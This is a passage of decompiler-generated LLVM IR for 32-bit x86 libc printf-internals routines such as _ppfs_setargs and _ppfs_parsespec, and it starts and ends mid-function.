  uselistorder i32 %v0_804e4d6, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804e4d3, { 0, 2, 1 }
  uselistorder i32 %v1_804e4d0, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_804e50b, { 1, 0 }
  uselistorder label %dec_label_pc_804e4df, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804e510 = load i32, i32* @esi, align 4
  %v0_804e511 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e51d = add i32 %arg1, 24
  %v2_804e51d = inttoptr i32 %v1_804e51d to i32*
  %v3_804e51d = load i32, i32* %v2_804e51d, align 4
  %v2_804e520 = add i32 %arg1, 76
  %v3_804e520 = inttoptr i32 %v2_804e520 to i32*
  store i32 %arg2, i32* %v3_804e520, align 4
  %tmp8 = icmp slt i32 %v3_804e51d, 1
  br i1 %tmp8, label %dec_label_pc_804e54e, label %dec_label_pc_804e527

dec_label_pc_804e527:                             ; preds = %entry
  %v1_804e52a = load i32, i32* @ebx, align 4
  %v2_804e52a = add i32 %v1_804e52a, 28
  %v3_804e52a = inttoptr i32 %v2_804e52a to i32*
  store i32 %v3_804e51d, i32* %v3_804e52a, align 4
  %v0_804e52d = load i32, i32* @ebx, align 4
  %v1_804e52d = add i32 %v0_804e52d, 24
  %v2_804e52d = inttoptr i32 %v1_804e52d to i32*
  store i32 0, i32* %v2_804e52d, align 4
  %v0_804e534 = load i32, i32* @ebx, align 4
  %v1_804e534 = add i32 %v0_804e534, 4
  %v2_804e534 = inttoptr i32 %v1_804e534 to i32*
  store i32 0, i32* %v2_804e534, align 4
  %v0_804e53b = load i32, i32* @ebx, align 4
  %v1_804e53b = add i32 %v0_804e53b, 8
  %v2_804e53b = inttoptr i32 %v1_804e53b to i32*
  store i32 0, i32* %v2_804e53b, align 4
  %v0_804e542 = load i32, i32* @ebx, align 4
  %v1_804e543 = call i32 @_ppfs_setargs(i32 %v0_804e542)
  %v1_804e548 = load i32, i32* @ebx, align 4
  %v2_804e548 = add i32 %v1_804e548, 24
  %v3_804e548 = inttoptr i32 %v2_804e548 to i32*
  store i32 %v3_804e51d, i32* %v3_804e548, align 4
  br label %dec_label_pc_804e54e

dec_label_pc_804e54e:                             ; preds = %entry, %dec_label_pc_804e527
  %v2_804e54e = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804e511, i32* @ebx, align 4
  store i32 %v0_804e510, i32* @esi, align 4
  ret i32 %v2_804e54e

; uselistorder directives
  uselistorder i32 %v3_804e51d, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e54e, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e555 = load i32, i32* @ebx, align 4
  store i32 %v0_804e555, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804e55a = add i32 %arg1, 80
  store i32 %v1_804e55a, i32* %ebx.global-to-local, align 4
  %v1_804e55d = add i32 %arg1, 24
  %v2_804e55d = inttoptr i32 %v1_804e55d to i32*
  %v3_804e55d = load i32, i32* %v2_804e55d, align 4
  %v4_804e55d = icmp eq i32 %v3_804e55d, 0
  %v1_804e561 = icmp eq i1 %v4_804e55d, false
  %v1_804e617 = add i32 %arg1, 8
  %v2_804e617 = inttoptr i32 %v1_804e617 to i32*
  %v3_804e617 = load i32, i32* %v2_804e617, align 4
  %v8_804e617 = icmp eq i32 %v3_804e617, -2147483648
  %v1_804e61e = icmp eq i1 %v8_804e617, false
  br i1 %v1_804e561, label %dec_label_pc_804e617, label %dec_label_pc_804e567

dec_label_pc_804e567:                             ; preds = %entry
  br i1 %v1_804e61e, label %dec_label_pc_804e581, label %dec_label_pc_804e570

dec_label_pc_804e570:                             ; preds = %dec_label_pc_804e567
  %v1_804e570 = add i32 %arg1, 76
  %v2_804e570 = inttoptr i32 %v1_804e570 to i32*
  %v3_804e570 = load i32, i32* %v2_804e570, align 4
  store i32 %v3_804e570, i32* %eax.global-to-local, align 4
  %v1_804e573 = add i32 %v3_804e570, 4
  store i32 %v1_804e573, i32* %edx.global-to-local, align 4
  store i32 %v1_804e573, i32* %v2_804e570, align 4
  %v0_804e579 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e579 = inttoptr i32 %v0_804e579 to i32*
  %v2_804e579 = load i32, i32* %v1_804e579, align 4
  store i32 %v2_804e579, i32* %eax.global-to-local, align 4
  %v1_804e57b = load i32, i32* @ecx, align 4
  %v2_804e57b = add i32 %v1_804e57b, 80
  %v3_804e57b = inttoptr i32 %v2_804e57b to i32*
  store i32 %v2_804e579, i32* %v3_804e57b, align 4
  %v0_804e57e = load i32, i32* %eax.global-to-local, align 4
  %v1_804e57e = load i32, i32* @ecx, align 4
  %v2_804e57e = add i32 %v1_804e57e, 8
  %v3_804e57e = inttoptr i32 %v2_804e57e to i32*
  store i32 %v0_804e57e, i32* %v3_804e57e, align 4
  %v0_804e581.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e581

dec_label_pc_804e581:                             ; preds = %dec_label_pc_804e567, %dec_label_pc_804e570
  %v1_804e590 = phi i32 [ %arg1, %dec_label_pc_804e567 ], [ %v0_804e581.pre, %dec_label_pc_804e570 ]
  %v1_804e581 = add i32 %v1_804e590, 4
  %v2_804e581 = inttoptr i32 %v1_804e581 to i32*
  %v3_804e581 = load i32, i32* %v2_804e581, align 4
  %v8_804e581 = icmp eq i32 %v3_804e581, -2147483648
  %v1_804e588 = icmp eq i1 %v8_804e581, false
  br i1 %v1_804e588, label %dec_label_pc_804e59b, label %dec_label_pc_804e58a

dec_label_pc_804e58a:                             ; preds = %dec_label_pc_804e581
  %v1_804e58a = add i32 %v1_804e590, 76
  %v2_804e58a = inttoptr i32 %v1_804e58a to i32*
  %v3_804e58a = load i32, i32* %v2_804e58a, align 4
  store i32 %v3_804e58a, i32* %eax.global-to-local, align 4
  %v1_804e58d = add i32 %v3_804e58a, 4
  store i32 %v1_804e58d, i32* %edx.global-to-local, align 4
  store i32 %v1_804e58d, i32* %v2_804e58a, align 4
  %v0_804e593 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e593 = inttoptr i32 %v0_804e593 to i32*
  %v2_804e593 = load i32, i32* %v1_804e593, align 4
  store i32 %v2_804e593, i32* %eax.global-to-local, align 4
  %v1_804e595 = load i32, i32* @ecx, align 4
  %v2_804e595 = add i32 %v1_804e595, 80
  %v3_804e595 = inttoptr i32 %v2_804e595 to i32*
  store i32 %v2_804e593, i32* %v3_804e595, align 4
  %v0_804e598 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e598 = load i32, i32* @ecx, align 4
  %v2_804e598 = add i32 %v1_804e598, 4
  %v3_804e598 = inttoptr i32 %v2_804e598 to i32*
  store i32 %v0_804e598, i32* %v3_804e598, align 4
  %v1_804e61017.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e59b

dec_label_pc_804e59b:                             ; preds = %dec_label_pc_804e581, %dec_label_pc_804e58a
  %v1_804e61017 = phi i32 [ %v1_804e590, %dec_label_pc_804e581 ], [ %v1_804e61017.pre, %dec_label_pc_804e58a ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804e61018 = add i32 %v1_804e61017, 28
  %v3_804e61019 = inttoptr i32 %v2_804e61018 to i32*
  %v4_804e61020 = load i32, i32* %v3_804e61019, align 4
  %v5_804e61321 = icmp sgt i32 %v4_804e61020, 0
  br i1 %v5_804e61321, label %dec_label_pc_804e59f, label %dec_label_pc_804e645.loopexit

dec_label_pc_804e59f:                             ; preds = %dec_label_pc_804e59b, %dec_label_pc_804e60f
  %v1_804e61023 = phi i32 [ %v1_804e610, %dec_label_pc_804e60f ], [ %v1_804e61017, %dec_label_pc_804e59b ]
  %v1_804e59f22 = phi i32 [ %v1_804e60f, %dec_label_pc_804e60f ], [ 0, %dec_label_pc_804e59b ]
  %v2_804e59f = mul i32 %v1_804e59f22, 4
  %v3_804e59f = add i32 %v2_804e59f, 40
  %v4_804e59f = add i32 %v3_804e59f, %v1_804e61023
  %v5_804e59f = inttoptr i32 %v4_804e59f to i32*
  %v6_804e59f = load i32, i32* %v5_804e59f, align 4
  store i32 %v6_804e59f, i32* %eax.global-to-local, align 4
  %v1_804e5a3 = add i32 %v6_804e59f, -8
  %v9_804e5a3 = icmp eq i32 %v1_804e5a3, 0
  br i1 %v9_804e5a3, label %dec_label_pc_804e60f, label %dec_label_pc_804e5a8

dec_label_pc_804e5a8:                             ; preds = %dec_label_pc_804e59f
  %v10_804e5a3 = icmp slt i32 %v1_804e5a3, 0
  %v6_804e5a3 = sub i32 7, %v6_804e59f
  %v7_804e5a3 = and i32 %v6_804e5a3, %v6_804e59f
  %v8_804e5a3 = icmp slt i32 %v7_804e5a3, 0
  %v1_804e5a8 = add i32 %v1_804e61023, 76
  %v2_804e5a8 = inttoptr i32 %v1_804e5a8 to i32*
  %v3_804e5a8 = load i32, i32* %v2_804e5a8, align 4
  store i32 %v3_804e5a8, i32* %edx.global-to-local, align 4
  %v3_804e5ab = icmp eq i1 %v10_804e5a3, %v8_804e5a3
  br i1 %v3_804e5ab, label %dec_label_pc_804e5bb, label %dec_label_pc_804e5ad

dec_label_pc_804e5ad:                             ; preds = %dec_label_pc_804e5a8
  %tmp15 = icmp slt i32 %v6_804e59f, 3
  %v9_804e5b4 = icmp eq i32 %v6_804e59f, 7
  %v1_804e5b7 = icmp eq i1 %v9_804e5b4, false
  %or.cond = or i1 %tmp15, %v1_804e5b7
  br i1 %or.cond, label %dec_label_pc_804e602, label %dec_label_pc_804e5e4

dec_label_pc_804e5bb:                             ; preds = %dec_label_pc_804e5a8
  %tmp16 = icmp sgt i32 %v6_804e59f, 1024
  br i1 %tmp16, label %dec_label_pc_804e5c4, label %dec_label_pc_804e602

dec_label_pc_804e5c4:                             ; preds = %dec_label_pc_804e5bb
  %v6_804e5c4 = icmp eq i32 %v6_804e59f, 2048
  br i1 %v6_804e5c4, label %dec_label_pc_804e5d4, label %dec_label_pc_804e5cb

dec_label_pc_804e5cb:                             ; preds = %dec_label_pc_804e5c4
  %v9_804e5cb = icmp eq i32 %v6_804e59f, 2055
  %v1_804e5d0 = icmp eq i1 %v9_804e5cb, false
  br i1 %v1_804e5d0, label %dec_label_pc_804e602, label %dec_label_pc_804e5f3

dec_label_pc_804e5d4:                             ; preds = %dec_label_pc_804e5c4
  %v1_804e5d4 = add i32 %v3_804e5a8, 8
  store i32 %v1_804e5d4, i32* %eax.global-to-local, align 4
  store i32 %v1_804e5d4, i32* %v2_804e5a8, align 4
  %v0_804e5da = load i32, i32* %edx.global-to-local, align 4
  %v1_804e5da = inttoptr i32 %v0_804e5da to i32*
  %v2_804e5da = load i32, i32* %v1_804e5da, align 4
  store i32 %v2_804e5da, i32* %eax.global-to-local, align 4
  %v1_804e5dc = add i32 %v0_804e5da, 4
  %v2_804e5dc = inttoptr i32 %v1_804e5dc to i32*
  %v3_804e5dc = load i32, i32* %v2_804e5dc, align 4
  store i32 %v3_804e5dc, i32* %edx.global-to-local, align 4
  %v1_804e5df = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e5df = add i32 %v1_804e5df, 4
  %v3_804e5df = inttoptr i32 %v2_804e5df to i32*
  store i32 %v3_804e5dc, i32* %v3_804e5df, align 4
  %v0_804e60a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e60a

dec_label_pc_804e5e4:                             ; preds = %dec_label_pc_804e5ad
  %v3_804e5e4 = load i32, i32* %v2_804e5a8, align 4
  store i32 %v3_804e5e4, i32* %edx.global-to-local, align 4
  %v1_804e5e7 = add i32 %v3_804e5e4, 8
  store i32 %v1_804e5e7, i32* %eax.global-to-local, align 4
  store i32 %v1_804e5e7, i32* %v2_804e5a8, align 4
  %v0_804e5ed = load i32, i32* %edx.global-to-local, align 4
  %v1_804e5ed = inttoptr i32 %v0_804e5ed to double*
  %v2_804e5ed = load double, double* %v1_804e5ed, align 4
  %v2_804e5ef = load i32, i32* %ebx.global-to-local, align 4
  %v4_804e5ef = inttoptr i32 %v2_804e5ef to double*
  store double %v2_804e5ed, double* %v4_804e5ef, align 4
  br label %dec_label_pc_804e60c

dec_label_pc_804e5f3:                             ; preds = %dec_label_pc_804e5cb
  %v3_804e5f3 = load i32, i32* %v2_804e5a8, align 4
  store i32 %v3_804e5f3, i32* %edx.global-to-local, align 4
  %v1_804e5f6 = add i32 %v3_804e5f3, 12
  store i32 %v1_804e5f6, i32* %eax.global-to-local, align 4
  store i32 %v1_804e5f6, i32* %v2_804e5a8, align 4
  %v0_804e5fc = load i32, i32* %edx.global-to-local, align 4
  %v1_804e5fc = inttoptr i32 %v0_804e5fc to x86_fp80*
  %v2_804e5fc = load x86_fp80, x86_fp80* %v1_804e5fc, align 4
  %v2_804e5fe = load i32, i32* %ebx.global-to-local, align 4
  %v3_804e5fe = inttoptr i32 %v2_804e5fe to x86_fp80*
  store x86_fp80 %v2_804e5fc, x86_fp80* %v3_804e5fe, align 4
  br label %dec_label_pc_804e60c

dec_label_pc_804e602:                             ; preds = %dec_label_pc_804e5ad, %dec_label_pc_804e5bb, %dec_label_pc_804e5cb
  %v1_804e602 = add i32 %v3_804e5a8, 4
  store i32 %v1_804e602, i32* %eax.global-to-local, align 4
  store i32 %v1_804e602, i32* %v2_804e5a8, align 4
  %v0_804e608 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e608 = inttoptr i32 %v0_804e608 to i32*
  %v2_804e608 = load i32, i32* %v1_804e608, align 4
  store i32 %v2_804e608, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e60a

dec_label_pc_804e60a:                             ; preds = %dec_label_pc_804e5d4, %dec_label_pc_804e602
  %v0_804e60a = phi i32 [ %v0_804e60a.pre, %dec_label_pc_804e5d4 ], [ %v2_804e608, %dec_label_pc_804e602 ]
  %v1_804e60a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e60a = inttoptr i32 %v1_804e60a to i32*
  store i32 %v0_804e60a, i32* %v2_804e60a, align 4
  %v0_804e60c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e60c

dec_label_pc_804e60c:                             ; preds = %dec_label_pc_804e5f3, %dec_label_pc_804e5e4, %dec_label_pc_804e60a
  %v0_804e60c = phi i32 [ %v2_804e5fe, %dec_label_pc_804e5f3 ], [ %v2_804e5ef, %dec_label_pc_804e5e4 ], [ %v0_804e60c.pre, %dec_label_pc_804e60a ]
  %v1_804e60c = add i32 %v0_804e60c, 12
  store i32 %v1_804e60c, i32* %ebx.global-to-local, align 4
  %v0_804e60f.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804e610.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e60f

dec_label_pc_804e60f:                             ; preds = %dec_label_pc_804e59f, %dec_label_pc_804e60c
  %v1_804e610 = phi i32 [ %v1_804e61023, %dec_label_pc_804e59f ], [ %v1_804e610.pre, %dec_label_pc_804e60c ]
  %v0_804e60f = phi i32 [ %v1_804e59f22, %dec_label_pc_804e59f ], [ %v0_804e60f.pre, %dec_label_pc_804e60c ]
  %v1_804e60f = add i32 %v0_804e60f, 1
  store i32 %v1_804e60f, i32* %esi.global-to-local, align 4
  %v2_804e610 = add i32 %v1_804e610, 28
  %v3_804e610 = inttoptr i32 %v2_804e610 to i32*
  %v4_804e610 = load i32, i32* %v3_804e610, align 4
  %v5_804e613 = icmp slt i32 %v1_804e60f, %v4_804e610
  br i1 %v5_804e613, label %dec_label_pc_804e59f, label %dec_label_pc_804e645.loopexit

dec_label_pc_804e617:                             ; preds = %entry
  br i1 %v1_804e61e, label %dec_label_pc_804e62e, label %dec_label_pc_804e620

dec_label_pc_804e620:                             ; preds = %dec_label_pc_804e617
  %v1_804e620 = add i32 %arg1, 36
  %v2_804e620 = inttoptr i32 %v1_804e620 to i8*
  %v3_804e620 = load i8, i8* %v2_804e620, align 1
  %v2_804e624 = zext i8 %v3_804e620 to i32
  %v3_804e624 = mul nuw nsw i32 %v2_804e624, 12
  store i32 %v3_804e624, i32* %eax.global-to-local, align 4
  %v2_804e627 = add i32 %arg1, 68
  %v3_804e627 = add i32 %v2_804e627, %v3_804e624
  %v4_804e627 = inttoptr i32 %v3_804e627 to i32*
  %v5_804e627 = load i32, i32* %v4_804e627, align 4
  store i32 %v5_804e627, i32* %eax.global-to-local, align 4
  store i32 %v5_804e627, i32* %v2_804e617, align 4
  %v0_804e62e.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e62e

dec_label_pc_804e62e:                             ; preds = %dec_label_pc_804e617, %dec_label_pc_804e620
  %v1_804e642 = phi i32 [ %arg1, %dec_label_pc_804e617 ], [ %v0_804e62e.pre, %dec_label_pc_804e620 ]
  %v1_804e62e = add i32 %v1_804e642, 4
  %v2_804e62e = inttoptr i32 %v1_804e62e to i32*
  %v3_804e62e = load i32, i32* %v2_804e62e, align 4
  %v8_804e62e = icmp eq i32 %v3_804e62e, -2147483648
  %v1_804e635 = icmp eq i1 %v8_804e62e, false
  br i1 %v1_804e635, label %dec_label_pc_804e645, label %dec_label_pc_804e637

dec_label_pc_804e637:                             ; preds = %dec_label_pc_804e62e
  %v1_804e637 = add i32 %v1_804e642, 37
  %v2_804e637 = inttoptr i32 %v1_804e637 to i8*
  %v3_804e637 = load i8, i8* %v2_804e637, align 1
  %v2_804e63b = zext i8 %v3_804e637 to i32
  %v3_804e63b = mul nuw nsw i32 %v2_804e63b, 12
  store i32 %v3_804e63b, i32* %eax.global-to-local, align 4
  %v1_804e63e = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e63e = add nsw i32 %v3_804e63b, -12
  %v3_804e63e = add i32 %v2_804e63e, %v1_804e63e
  %v4_804e63e = inttoptr i32 %v3_804e63e to i32*
  %v5_804e63e = load i32, i32* %v4_804e63e, align 4
  store i32 %v5_804e63e, i32* %eax.global-to-local, align 4
  store i32 %v5_804e63e, i32* %v2_804e62e, align 4
  %v0_804e645.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e645

dec_label_pc_804e645.loopexit:                    ; preds = %dec_label_pc_804e60f, %dec_label_pc_804e59b
  %v1_804e610.lcssa = phi i32 [ %v1_804e61017, %dec_label_pc_804e59b ], [ %v1_804e610, %dec_label_pc_804e60f ]
  br label %dec_label_pc_804e645

dec_label_pc_804e645:                             ; preds = %dec_label_pc_804e645.loopexit, %dec_label_pc_804e62e, %dec_label_pc_804e637
  %v10_804e64c = phi i32 [ %v1_804e610.lcssa, %dec_label_pc_804e645.loopexit ], [ %v1_804e642, %dec_label_pc_804e62e ], [ %v0_804e645.pre, %dec_label_pc_804e637 ]
  %v1_804e645 = add i32 %v10_804e64c, 8
  %v2_804e645 = inttoptr i32 %v1_804e645 to i32*
  %v3_804e645 = load i32, i32* %v2_804e645, align 4
  store i32 %v3_804e645, i32* %eax.global-to-local, align 4
  %v2_804e648 = icmp slt i32 %v3_804e645, 0
  %v1_804e64a = icmp eq i1 %v2_804e648, false
  br i1 %v1_804e64a, label %dec_label_pc_804e660, label %dec_label_pc_804e64c

dec_label_pc_804e64c:                             ; preds = %dec_label_pc_804e645
  %v1_804e64c = add i32 %v10_804e64c, 16
  %v2_804e64c = inttoptr i32 %v1_804e64c to i32*
  %v3_804e64c = load i32, i32* %v2_804e64c, align 4
  %v4_804e64c = or i32 %v3_804e64c, 8
  store i32 %v4_804e64c, i32* %v2_804e64c, align 4
  %v0_804e650 = load i32, i32* @ecx, align 4
  %v1_804e650 = add i32 %v0_804e650, 16
  %v2_804e650 = inttoptr i32 %v1_804e650 to i32*
  %v3_804e650 = load i32, i32* %v2_804e650, align 4
  %v4_804e650 = and i32 %v3_804e650, -2
  store i32 %v4_804e650, i32* %v2_804e650, align 4
  %v0_804e654 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e654 = sub i32 0, %v0_804e654
  store i32 %v1_804e654, i32* %eax.global-to-local, align 4
  %v1_804e656 = load i32, i32* @ecx, align 4
  %v2_804e656 = add i32 %v1_804e656, 8
  %v3_804e656 = inttoptr i32 %v2_804e656 to i32*
  store i32 %v1_804e654, i32* %v3_804e656, align 4
  %v0_804e659 = load i32, i32* @ecx, align 4
  %v1_804e659 = add i32 %v0_804e659, 20
  %v2_804e659 = inttoptr i32 %v1_804e659 to i32*
  store i32 32, i32* %v2_804e659, align 4
  %v0_804e662.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e660

dec_label_pc_804e660:                             ; preds = %dec_label_pc_804e645, %dec_label_pc_804e64c
  %v0_804e662 = phi i32 [ %v3_804e645, %dec_label_pc_804e645 ], [ %v0_804e662.pre, %dec_label_pc_804e64c ]
  %v2_804e660 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e660, i32* @ebx, align 4
  ret i32 %v0_804e662

; uselistorder directives
  uselistorder i32 %v3_804e63b, { 1, 0 }
  uselistorder i32 %v3_804e624, { 1, 0 }
  uselistorder i32 %v1_804e60f, { 2, 1, 0 }
  uselistorder i32 %v1_804e610, { 0, 2, 1 }
  uselistorder i32 %v3_804e5a8, { 1, 0, 2 }
  uselistorder i32* %v2_804e5a8, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804e5a3, { 1, 0 }
  uselistorder i32 %v6_804e59f, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804e59f22, { 1, 0 }
  uselistorder i1 %v1_804e61e, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 6, 2, 3, 4, 5, 7 }
  uselistorder i32 -12, { 32, 6, 7, 1, 2, 3, 4, 5, 8, 9, 0, 10, 19, 13, 12, 14, 11, 15, 16, 17, 18, 34, 33, 35, 24, 22, 20, 21, 23, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 37, { 3, 4, 2, 0, 1 }
  uselistorder i32 7, { 0, 5, 6, 7, 8, 9, 10, 11, 1, 3, 4, 2 }
  uselistorder i32 -8, { 27, 5, 6, 0, 1, 2, 3, 4, 7, 8, 9, 10, 19, 13, 12, 14, 11, 15, 16, 17, 18, 28, 29, 30, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 76, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_804e660, { 1, 0 }
  uselistorder label %dec_label_pc_804e645, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e62e, { 1, 0 }
  uselistorder label %dec_label_pc_804e60f, { 1, 0 }
  uselistorder label %dec_label_pc_804e60c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e60a, { 1, 0 }
  uselistorder label %dec_label_pc_804e602, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e59f, { 1, 0 }
  uselistorder label %dec_label_pc_804e59b, { 1, 0 }
  uselistorder label %dec_label_pc_804e581, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804e664 = load i32, i32* @eax, align 4
  br label %dec_label_pc_804e66b

dec_label_pc_804e66b:                             ; preds = %dec_label_pc_804e66b, %entry
  %v0_804e66b = phi i32 [ ptrtoint (i8** @global_var_8050a12.117 to i32), %entry ], [ %v1_804e66b, %dec_label_pc_804e66b ]
  %v1_804e66b = add i32 %v0_804e66b, -2
  %v1_804e66e = inttoptr i32 %v1_804e66b to i16*
  %v2_804e66e = load i16, i16* %v1_804e66e, align 2
  %v3_804e66e = sext i16 %v2_804e66e to i32
  %v12_804e671 = icmp ne i32 %v3_804e66e, %v0_804e664
  %v6_804e67b = icmp ugt i32 %v1_804e66b, ptrtoint (i32* @global_var_80509fa.118 to i32)
  %or.cond = and i1 %v6_804e67b, %v12_804e671
  br i1 %or.cond, label %dec_label_pc_804e66b, label %dec_label_pc_804e67d

dec_label_pc_804e67d:                             ; preds = %dec_label_pc_804e66b
  %.pre = add i32 %v0_804e66b, -134547964
  %v2_804e683 = sdiv i32 %.pre, 2
  store i32 %v2_804e683, i32* @edx, align 4
  %v1_804e685 = add i32 %v2_804e683, ptrtoint (i8** @global_var_8050a12.117 to i32)
  %v2_804e685 = inttoptr i32 %v1_804e685 to i8*
  %v3_804e685 = load i8, i8* %v2_804e685, align 1
  %v4_804e685 = zext i8 %v3_804e685 to i32
  ret i32 %v4_804e685

; uselistorder directives
  uselistorder i32 %v2_804e683, { 1, 0 }
  uselistorder i32 %v1_804e66b, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8050a12.117 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e68e = load i32, i32* @edi, align 4
  %v0_804e68f = load i32, i32* @esi, align 4
  %v0_804e690 = load i32, i32* @ebx, align 4
  store i32 %v0_804e690, i32* %stack_var_-16, align 4
  %v4_804e690 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804e6bc = add i32 %tmp76, 24
  %v2_804e6bc = inttoptr i32 %v1_804e6bc to i32*
  %v3_804e6bc = load i32, i32* %v2_804e6bc, align 4
  store i32 %v3_804e6bc, i32* %eax.global-to-local, align 4
  %v1_804e6c3 = add i32 %tmp76, 16
  %v2_804e6c3 = inttoptr i32 %v1_804e6c3 to i32*
  %v3_804e6c3 = load i32, i32* %v2_804e6c3, align 4
  %v1_804e6c6 = and i32 %v3_804e6c3, 128
  %v2_804e6c6 = icmp eq i32 %v1_804e6c6, 0
  store i32 %v1_804e6c6, i32* %edi.global-to-local, align 4
  %v1_804e6cc = icmp eq i1 %v2_804e6c6, false
  br i1 %v1_804e6cc, label %dec_label_pc_804e6df, label %dec_label_pc_804e6ce

dec_label_pc_804e6ce:                             ; preds = %entry
  %v2_804e6ce = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804e72c.outer

dec_label_pc_804e6d9:                             ; preds = %dec_label_pc_804e867
  %v1_804e6d9 = add i32 %v0_804e867.pre.pre, 1
  store i32 %v1_804e6d9, i32* @esi, align 4
  br label %dec_label_pc_804e877

dec_label_pc_804e6df:                             ; preds = %entry
  %v15_804e691 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e6e1

dec_label_pc_804e6e1:                             ; preds = %dec_label_pc_804e709.dec_label_pc_804e6e1_crit_edge, %dec_label_pc_804e6df
  %v2_804e6f2 = phi i32 [ %v2_804e6f2.pre, %dec_label_pc_804e709.dec_label_pc_804e6e1_crit_edge ], [ %v15_804e691, %dec_label_pc_804e6df ]
  %v3_804e6f2 = phi i32 [ %v1_804e709, %dec_label_pc_804e709.dec_label_pc_804e6e1_crit_edge ], [ 0, %dec_label_pc_804e6df ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804e6e5 = mul i32 %v3_804e6f2, 4
  store i32 %v1_804e6e5, i32* @ecx, align 4
  %v2_804e6ec = load i32, i32* %arg1, align 4
  store i32 %v2_804e6ec, i32* @edx, align 4
  %v2_804e6ee = add i32 %v1_804e6e5, -4
  %v3_804e6ee = add i32 %v2_804e6ee, %v2_804e6ec
  %v4_804e6ee = inttoptr i32 %v3_804e6ee to i32*
  %v5_804e6ee = load i32, i32* %v4_804e6ee, align 4
  store i32 %v5_804e6ee, i32* %eax.global-to-local, align 4
  %v1_804e6f2 = trunc i32 %v5_804e6ee to i8
  %v4_804e6f2 = add i32 %v2_804e6f2, 36
  %v5_804e6f2 = add i32 %v4_804e6f2, %v3_804e6f2
  %v6_804e6f2 = inttoptr i32 %v5_804e6f2 to i8*
  store i8 %v1_804e6f2, i8* %v6_804e6f2, align 1
  %v0_804e6f6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e6f6 = urem i32 %v0_804e6f6, 256
  %v2_804e6f6 = load i32, i32* @ebx, align 4
  %v3_804e6f6 = and i32 %v2_804e6f6, -256
  %v4_804e6f6 = or i32 %v3_804e6f6, %v1_804e6f6
  store i32 %v4_804e6f6, i32* @ebx, align 4
  %v1_804e6f8 = mul i32 %v0_804e6f6, 16777216
  %v2_804e6f8 = sdiv i32 %v1_804e6f8, 16777216
  store i32 %v2_804e6f8, i32* %eax.global-to-local, align 4
  %v1_804e6fb = load i32, i32* @edx, align 4
  %v2_804e6fb = load i32, i32* @ecx, align 4
